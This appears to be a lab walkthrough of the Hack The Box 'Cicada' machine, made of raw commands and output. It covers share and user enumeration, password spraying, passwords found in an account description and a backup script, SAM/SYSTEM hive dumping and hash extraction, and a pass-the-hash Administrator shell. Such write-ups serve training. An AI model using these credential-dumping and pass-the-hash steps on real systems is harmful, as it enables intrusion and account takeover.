pcclient $> srvinfo
	10.129.125.56  Wk Sv PDC Tim NT     CICADA-DC
	platform_id     :	500
	os version      :	10.0
	server type     :	0x80102b
***
Domain Name: CICADA
Domain Sid: S-1-5-21-917908876-1423158569-3159038727
***
***
─[eu-dedivip-1]─[10.10.14.156]─[kaimup@htb-h8an2h60bg]─[~/Desktop]
└──╼ [★]$ smbclient -L //10.129.125.56 -U guest
Password for [WORKGROUP\guest]:

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	DEV             Disk      
	HR              Disk      
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.129.125.56 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
***
rootDomainNamingContext: DC=cicada,DC=htb
ldapServiceName: cicada.htb:cicada-dc$@CICADA.HTB
isGlobalCatalogReady: TRUE

***

SMB         10.129.125.56   445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)

***

***NAME FOUND***

MB         10.129.125.56   445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
SMB         10.129.125.56   445    CICADA-DC        [+] cicada.htb\root:123456 (Guest)
┌─[eu-dedivip-1]─[10.10.14.156]─[kaimup@htb-h8an2h60bg]─[~/Desktop]
└──╼ [★]$ crackmapexec smb 10.129.125.56 -u names.txt -p 500-worst-passwords.txt 
SMB         10.129.125.56   445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
SMB         10.129.125.56   445    CICADA-DC        [+] cicada.htb\****aaliyah***:123456 (Guest)
***

Your default password is: Cicada$*********

***
CICADA\john.smoulder (SidTypeUser)
SMB         10.129.125.56   445    CICADA-DC        1105: CICADA\sarah.dantelia (SidTypeUser)
SMB         10.129.125.56   445    CICADA-DC        1106: CICADA\michael.wrightson (SidTypeUser)
SMB         10.129.125.56   445    CICADA-DC        1108: CICADA\david.orelious (SidTypeUser)
SMB         10.129.125.56   445    CICADA-DC        1109: CICADA\Dev Support (SidTypeGroup)
SMB         10.129.125.56   445    CICADA-DC        1601: CICADA\emily.oscars (SidTypeUser)
502: CICADA\krbtgt (SidTypeUser)
 10.129.125.56   445    CICADA-DC        500: CICADA\Administrator (SidTypeUser)

john.smoulder
sarah.dantelia
michael.wrightson  - √
david.orelious
emily.oscars

smb: \> ls
NT_STATUS_ACCESS_DENIED listing \*
***

***COMMAND USED***
enum4linux-ng -U 10.129.125.56 -u michael.wrightson -p 'Cicada$M6Corpb*@Lp#nZp!8'


**OUTPUT***
----snip-----
username: david.orelious
  name: (null)
  acb: '0x00000210'
  description: Just in case I forget my password is aRt$Lp#7t*VQ!3******
--snip----

***
Password for [WORKGROUP\david.orelious]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Mar 14 07:31:39 2024
  ..                                  D        0  Thu Mar 14 07:21:29 2024
  Backup_script.ps1
  ***
  Inside of backup_scripts.ps1
sourceDirectory = "C:\smb"
$destinationDirectory = "D:\Backup"

$username = "emily.oscars"
$password = ConvertTo-SecureString "**********" -AsPlainText -Force
$credentials = New-Object System.Management.Automation.PSCredential($username, $password)
$dateStamp = Get-Date -Format "yyyyMMdd_HHmmss"
$backupFileName = "smb_backup_$dateStamp.zip"
$backupFilePath = Join-Path -Path $destinationDirectory -ChildPath $backupFileName
Compress-Archive -Path $sourceDirectory -DestinationPath $backupFilePath
Write-Host "Backup completed successfully. Backup file saved to: $backupFilePath"


Administrator:500:aad3b435b51404eeaad3b435b51404ee:


***
netexec winrm cicada.htb -u emily.oscars -p 'Q!3@Lp#M6b******'


***
*Evil-WinRM* PS C:\> reg save hklm\sam c:\Temp\sam The operation completed successfully. *Evil-WinRM* PS C:\> reg save hklm\system c:\Temp\system The operation completed successfully. *Evil-WinRM* PS C:\>

***

*Evil-WinRM* PS C:\Temp> download sam Info: Downloading C:\Temp\sam to sam Info: Download successful! *Evil-WinRM* PS C:\Temp> download system Info: Downloading C:\Temp\system to system Info: Download successful!
***
┌──(kaimup@htb)-[~/Documents/HTB/Cicada] └─$ pypykatz registry --sam sam system WARNING:pypykatz:SECURITY hive path not supplied! Parsing SECURITY will not work WARNING:pypykatz:SOFTWARE hive path not supplied! Parsing SOFTWARE will not work ============== SYSTEM hive secrets ============== CurrentControlSet: ControlSet001 Boot Key: 3c2b033757a49110a9ee680b46e8d620 ============== SAM hive secrets ============== HBoot Key: a1c299e572ff8c643a857d3fdb3e5c7c1010101010101010101010101 Administrator:500:aad3b435b51404eeaad3b435b5:2b87e7c93a3e8a0*********::: Guest:501:aad3b435b51404eeaad3b435b5:31d6cfe0d16ae931b73c5***********::: DefaultAccount:503:aad3b435b51404eeaad3b435b5:31d6cfe0d16ae931b7*****:::

***
┌──(kaimup@htb)-[~/Documents/HTB/Cicada] └─$ evil-winrm -i cicada.htb -u administrator -H 2b87e7c93a3e8a0ea4a******** 

Evil-WinRM shell v3.5 Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion Info: Establishing connection to remote endpoint *Evil-WinRM* PS C:\Users\Administrator\Documents> whoami cicada\administrator
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd C:\users\administrator\desktop 
*Evil-WinRM* PS C:\users\administrator\desktop> dir 
Directory: C:\users\administrator\desktop Mode LastWriteTime Length Name ---- ------------- ------ ---- -ar--- 10/25/2024 9:39 AM 34 root.txt 
*Evil-WinRM* PS C:\users\administrator\desktop> more root.txt; whoami; hostname; ipconfig 5b0c7aa6cd96c1058bed******** cicada\administrator CICADA-DC

***
